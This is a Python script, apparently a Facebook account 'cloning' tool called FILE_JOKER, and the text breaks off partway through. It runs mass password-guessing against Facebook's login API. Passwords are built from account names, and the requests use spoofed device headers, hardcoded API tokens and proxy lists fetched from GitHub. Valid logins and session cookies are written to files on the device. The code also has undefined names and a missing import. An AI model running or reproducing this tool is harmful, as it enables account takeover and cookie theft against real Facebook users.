fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana')

try:
    import os,requests,json,time,re,random,sys,uuid,string,subprocess
    from string import *
    import bs4, subprocess,random
    #import dz
    from concurrent.futures import ThreadPoolExecutor as tred
    from bs4 import BeautifulSoup as sop
    from bs4 import BeautifulSoup
except ModuleNotFoundError: 
    print('\n Installing missing modules ...')
    os.system('pip install requests bs4 futures==2 > /dev/null')
    os.system('python FILE_JOKER.py')
	
os.system('xdg-open https://www.facebook.com/kanokwan.plengien')

try:
    prox= requests.get('https://raw.githubusercontent.com/trt-Fire/data/main/proxies.txt').text
    open('proxies.txt','w').write(proxies)
except Exception as e:
    print('\x1b[1;93mCHECKING FOR UPDATE...')
	
proxies=open('proxies.txt','r').read().splitlines()


android_models=[]
try:
    xx = requests.get('https://raw.githubusercontent.com/trt-Fire/data/main/strings.txt').text.splitlines()
    for line in xx:
        android_models.append(line)
except:pass

usr=[]
try:
    xd=requests.get('https://raw.githubusercontent.com/trt-Fire/data/main/ua.txt').text.splitlines()
    for us in xd:
        usr.append(us)
except: pass

gt = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550	5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
ugen=[]
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['6','7','8','9','10','11','12','13'])
    c=f' en-us; {str(gt)}'
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
for agent in range(10000):
    aa='Mozilla/5.0 (Linux; Android 6.0.1;'
    b=random.choice(['6','7','8','9','10','11','12','13'])
    c='en-us; 10; T-Mobile myTouch 3G Slide Build/GRI40)I148V)'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/533.1'
    fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(fullagnt)
rug=[]
for nt in range(10000):
    rr=random.randint
    aZ=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    rx=random.randrange(1, 999)
    xx=f"Mozilla/5.0 (Windows NT 10.0; {str(rr(9,11))}; Win64; x64){str(aZ)}{str(rx)}{str(aZ)}) AppleWebKit/537.36 (KHTML, like Gecko){str(rr(99,149))}.0.{str(rr(4500,4999))}.{str(rr(35,99))} Chrome/{str(rr(99,175))}.0.{str(rr(0,5))}.{str(rr(0,5))} Safari/537.36"
    rug.append(xx)
ruz=[]
for mtc in range(10000):
    rr=random.randint
    xd=f"Mozilla/5.0 (Macintosh; Intel Mac OS {str(rr(7,15))} {str(rr(7,15))}_{str(rr(1,9))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(99,199))}.0.{str(rr(3999,4999))}.{str(rr(99,150))} Safari/537.36 OPR/{str(rr(99,199))}.0.{str(rr(3999,4999))}.{str(rr(99,150))}"
    ruz.append(xd)
	
#new ua
ugen=[]
for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android 6.0.1;'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/533.1'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)

sim_id = ''
android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
fblc = 'en_GB'
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
except:
        fbcr = 'Zong'
fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
fbdv = model
fbsv = android_version
fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
fbdm = '{density=2.0,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
        total = 0
        for i in fbcr:
                total+=1
        select = ('1','2')
        if select == '1':
                fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
                sim_id+=fbcr
        elif select == '2':
                try:
                        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
                        sim_id+=fbcr
                except Exception as e:
                        fbcr = "Zong"
                        sim_id+=fbcr
        else:
                fbcr = 'Zong'
                sim_id+=fbcr
except:
        fbcr = "Zong"
device = {
        'android_version':android_version,
        'model':model,
        'build':build,
        'fblc':fblc,
        'fbmf':fbmf,
        'fbbd':fbbd,
        'fbdv':model,
        'fbsv':fbsv,
        'fbca':fbca,
        'fbdm':fbdm}
os.system('xdg-open https://www.facebook.com/kanokwan.plengien')
##______COLORS____ARE________######
pwx=[]
W = '\033[97;1m'
R = '\033[91;1m'
G = '\033[92;1m'
Y = '\033[93;1m'
B = '\033[94;1m'
P = '\033[95;1m'
S = '\033[96;1m'
N = '\x1b[0m'
PURPLE ='\x1b[38;5;46m'
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m'
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
BLACK="\033[1;30m"
EXTRA ='\x1b[38;5;208m'

logo=(f"""

\033[1;92m   d88b  .d88b.  db   dD d88888b d8888b. 
\033[1;92m   `8P' .8P  Y8. 88 ,8P' 88'     88  `8D 
\033[1;31m   88  88    88 88,8P   88ooooo 88oobY' 
\033[1;31m    88  88    88 88`8b   88~~~~~ 88`8b   
\033[1;92mdb. 88  `8b  d8' 88 `88. 88.     88 `88. 
\033[1;92mY8888P   `Y88P'  YP   YD Y88888P 88   YD 
__________________________________________________

\033[1;92m   ▁ ▂ ▃ ▅ ▆ ▇ █ \033[1;31m𝐀𝐔𝐓𝐇𝐎𝐑:𝐇𝐀𝐉𝐈 𝐉𝐎𝐊𝐄𝐑\033[1;92m █ ▇ ▆ ▅ ▃ ▂ ▁                                                         
──────────────────────────────────────────────────
\033[1;92m Owner   :            𝐒𝐇𝐀𝐇𝐈 𝐉𝐎𝐊𝐄𝐑
\033[1;92m Facebook:            𝐌𝐑 𝐒𝐇𝐀𝐇𝐈 𝐉𝐎𝐊𝐄𝐑
\033[1;92m Github  :            𝐇𝐀𝐉𝐈 𝐉𝐎𝐊𝐄𝐑 𝐊𝐇𝐀𝐍𝐎𝐎
\033[1;92m Version :            0.0.4
──────────────────────────────────────────────────""")
#__________________MAIN____________#
def linex():
        print('\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')    
def clear():
    os.system("clear")
    print(logo)    








def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        print('\n')
        print(' \x1b[1;92m\x1b[1;91m\x1b[1;96m\x1b[0mThe Cloneing Has Been Complete\x1b[1;96m\x1b[1;91m\x1b[1;92m\x1b[0m')
        print(' TOTAL OK: \x1b[1;92m%s' % str(len(oks)))
        print(' TOTAL CP: \x1b[1;96m%s' % str(len(cps)))
        input("Press enter to back FILE_JOKER Menu ")
        exit()
os.system("xd-open https://github.com/Tox1c-143")
def menu():   
    os.system('clear')
    print(logo)
    print(f'\x1b[38;5;196m[\x1b[1;92m1\x1b[38;5;196m] \033[38;5;46mFile Cloneing')
    print(f'\x1b[38;5;196m[\x1b[1;92m2\x1b[38;5;196m]\033[38;5;46m \033[38;5;46mRandom Cloneing ')
    print(f'\x1b[38;5;196m[\x1b[1;92m3\x1b[38;5;196m]\033[38;5;46m \033[38;5;46mContact Admin')
    print(f'\x1b[38;5;196m[\x1b[1;92m●\x1b[38;5;196m]\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    select = input('\x1b[38;5;196m[\x1b[1;92m●\x1b[38;5;196m]\x1b[38;5;46mSELECT MENU : ')
    if select =='1':
        method_crack()
    elif select =='2':
        AFG_CLONING()
  ###  elif select =='2':
       ## random_number()
    elif select =='3':
       os.system('xdg-open https://t.me/+93707266012');menu()
    else:
        print('\n Select Wrong option ... ')
        time.sleep(2)
        FILE_JOKER(allkey)
       # os.system('xdg-open https://wa.me/+8801310067277')
#---------------------[ USER - AGENT ] -------------------#
def uaxxx():
    ua='[FBAN/FB4A;FBAV/83.0.0.5091;FBBV/8586033;FBDM/{density=1,width=720,height=1280};FBLC/en_US;FBRV/5718626;FBCR/null;FBMF/sony Ericsson Xperia U;FBBD/sony Ericsson Xperia U;FBPN/com.facebook.katana;FBDV/;FBSV/5.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
    return ua
def method_crack():
    global methods
    clear()
    print("\x1b[38;5;196m[\x1b[1;92m●\x1b[38;5;196m] \033[38;5;46mSELECT METHOD")
    print("\x1b[38;5;196m[\x1b[1;92m●\x1b[38;5;196m]\033[38;5;46m METHOD All IS IN PROCESSING ")
    print("\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print(f'\x1b[38;5;196m[\033[38;5;46m1\x1b[38;5;196m] \033[38;5;46mMethod \x1b[1;92m●\033[38;5;46m graph')
    print(f'\x1b[38;5;196m[\033[38;5;46m2\x1b[38;5;196m]\033[38;5;46m Method \x1b[1;92m●\033[38;5;46m B-graph')
    print(f'\x1b[38;5;196m[\033[38;5;46m3\x1b[38;5;196m] \033[38;5;46mMethod \x1b[1;92m●\033[38;5;46m API')
    print(f'\x1b[38;5;196m[\033[38;5;46m4\x1b[38;5;196m] \033[38;5;46mMethod \x1b[1;92m●\033[38;5;46m B-api')
    print(f'\x1b[38;5;196m[\033[38;5;46m0\x1b[38;5;196m] \033[38;5;46mBack')
    print(f"\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    option = input('\x1b[38;5;196m[\x1b[1;92m●\x1b[38;5;196m]\x1b[38;5;46mSelect Method : ')
    if option =='1':
        methods.append('methodA')
        main_crack().crack(id)
    elif option =='2':
        methods.append('methodB')
        main_crack().crack(id)
    elif option =='3':
        methods.append('methodC')
        main_crack().crack(id)
    elif option =='4':
        methods.append('methodD')
        main_crack().crack(id)
    elif option =='0':
        Siam()
    else:
      print('\n Select Wrong Option ...')
      time.sleep(2)
      method_crack()

class main_crack():
    def __init__(self):
        self.id=[]
    def crack(self,id):
        global methods
        clear()
        print("\x1b[38;5;196m[\x1b[1;92m●\x1b[38;5;196m]\033[38;5;46m Put File  Example ● /sdcard/file.txt ")
        self.file = input('\x1b[38;5;196m[\x1b[1;92m●\x1b[38;5;196m]\x1b[1;92m File Path ● ')
        try:
            self.id = open(self.file).read().splitlines()
            self.pasw()
        except FileNotFoundError:
            print('Worng File Please confram you r file etc...')
            time.sleep(2)
            os.system('clear')
            print(logo)
            print('Try Again ...')
            time.sleep(2)
            main_crack().crack(id)
            
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f'\r\r\33[1;92m [\33[1;92mFILE_JOKER-XD-M1\33[1;92m] %s | \033[1;92mOK:-%s  \033[1;92m'%(loop,len(oks)));sys.stdout.flush()
            sys.stdout.flush()
            android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
            facebook_version = f'{random.randint(10,432)}.0.0.{random.randint(11,99)}.{random.randint(1,200)}'
            fbbv = str(random.randint(10000000, 99999999))
            fbrv = str(random.randint(10000000, 99999999))
            fbsv = f"{random.uniform(4.0, 10.0):.1f}"
            density = random.choice(["2.0","2.25","2.75","3.0","3.25","3 75"])
            width = random.randint(720, 1440)
            height = random.randint(1080, 2560)
            fblc = random.choice(["ja_JP","ex_MX","en_CU","en_US","fr_FR","es_ES","pt_BR","de_DE","it_IT","ja_JP","ko_KR","ru_RU","zh_CN","ar_AE","en_GB"])
            fbcr = random.choice(["Grameenphone","Robi","Banglalink","Teletalk"])
            fban = random.choice(["FB4A", "FB5A", "FB6A"])
            fbpn = random.choice(["com.facebook.katana", "com.facebook.orca","messenger-android", "com.facebook.lite"])
            ######m1#####
            sony = random.choice(['SonyEricssonST25iv','SonyEricssonST25i','Xperia U'])
            uaxx = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/412.0.0.22.115;FBPN/com.facebook.katana;FBLC/pt_BR;FBBV/468774204;FBCR/CLARO BR;FBMF/Xiaomi;FBBD/Redmi;FBDV/M1908C3JGG;FBSV/11;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2216};FB_FW/1;FBRV/470765339;] FBBK/1'
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            except:
                ls = fs
            for pw in psw:
                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())             
                
                with requests.Session() as session:                                       
                    data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"secure_family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "account_recovery",
'sim_serials': "['80973453345210784798']",
'openid_flow': 'android_login',
'openid_provider': 'google',
"email": sid,
"password": ps,
"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "V2_UNTAGGED",
'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "en_US",
"client_country_code": "US",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "AuthOperations$PasswordAuthOperation",
"api_key": "882a8490361da98702bf97a021ddc14d"}
                content_lenght = ("&").join([ "%s=%s" % (key, value) for key, value in data.items() ])
                headers = {'User-Agent':uaxx,
'Content-Type': 'application/x-www-form-urlencoded',
'x-fb-Connection-Type': 'MOBILE.LTE',
'Accept': '*/*',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': str(random.randint(2e4, 4e4)),
'X-FB-SIM-HNI': str(random.randint(2e4, 4e4)),
'X-Fb-Connection-Bandwidth': str(random.randint(20000000, 30000000)),
'Priority' : 'u=3,i',
'Zero-Rated': '0',
'X-Fb-Connection-Quality': 'GOOD',
'X-FB-Friendly-Name': 'authenticate',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'X-Fb-Device-Group': '5120',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
'Content-Length': str(len(content_lenght))}
                q = session.post("https://graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);FILE_JOKERb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={FILE_JOKERb};{ckkk}"
                    print(f"\r{R} \x1b[38;5;196m[\033[38;5;46mFILE_JOKER-💚\x1b[38;5;196m] \x1b[38;5;46m{sid} \x1b[1;92m●\x1b[38;5;46m {ps} {S}\n=#={ckkk}")
                    
                    Elite(sid,ps,ckkk)
                    oks.append(sid)                 
                    open('/sdcard/FILE_JOKER/OK_ids_M1.txt','a').write(sid+'●'+ps+'\n');open('/sdcard/FILE_JOKER/COOKiEs_M1.txt','a').write(sid+'●'+ps+'●'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     #print(f"\r\x1b[1;96m [FILE_JOKER-CP] {sid} ● {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/FILE_JOKER/M1-CP.txt','a').write(sid+'●'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
            self.methodA(sid, name, ps)
         #METHOD3   
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f'\r\r\33[1;92m [\33[1;92mFILE_JOKER-XD-M3\33[1;92m] %s | \033[1;92mOK:-%s  \033[1;92m'%(loop,len(oks)));sys.stdout.flush()
            sys.stdout.flush()
            android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
            facebook_version = f'{random.randint(10,432)}.0.0.{random.randint(11,99)}.{random.randint(1,200)}'
            fbbv = str(random.randint(10000000, 99999999))
            fbrv = str(random.randint(10000000, 99999999))
            fbsv = f"{random.uniform(4.0, 10.0):.1f}"
            density = random.choice(["2.0","2.25","2.75","3.0","3.25","3 75"])
            width = random.randint(720, 1440)
            height = random.randint(1080, 2560)
            fblc = random.choice(["ja_JP","ex_MX","en_CU","en_US","fr_FR","es_ES","pt_BR","de_DE","it_IT","ja_JP","ko_KR","ru_RU","zh_CN","ar_AE","en_GB"])
            fbcr = random.choice(["Telenor","fido","MOVO AFRICA","UFONE-PAKTel","Zong","Jazz","SCO","Jio","Vodafone","Airtel","BSNL","MTNL","Grameenphone","Robi","Banglalink","Teletalk","Telkomsel","Indosat Ooredoo","Axiata","Tri","Smartfren","China Mobile","Unicom","Telecom","Satcom","Docomo","Rakuten","IIJmio","Orange","Verizon","AT&T","T-Mobile","Sprint","Vodafone","Telefonica","EE","Orange","Three"])
            fban = random.choice(["FB4A", "FB5A", "FB6A"])
            fbpn = random.choice(["com.facebook.katana", "com.facebook.orca","messenger-android", "com.facebook.lite"])
            sony = random.choice(['SonyEricssonST25iv','SonyEricssonST25i','Xperia U'])
            #######m3####
            uaxx = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/412.0.0.22.115;FBPN/com.facebook.katana;FBLC/pt_BR;FBBV/468774204;FBCR/CLARO BR;FBMF/Xiaomi;FBBD/Redmi;FBDV/M1908C3JGG;FBSV/11;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2216};FB_FW/1;FBRV/470765339;] FBBK/1'
            ######
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            except:
                ls = fs
            for pw in psw:
                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())             
                with requests.Session() as session:                                       
                    data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"secure_family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "account_recovery",
'sim_serials': "['80973453345210784798']",
'openid_flow': 'android_login',
'openid_provider': 'google',
"email": sid,
"password": ps,
"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "V2_UNTAGGED",
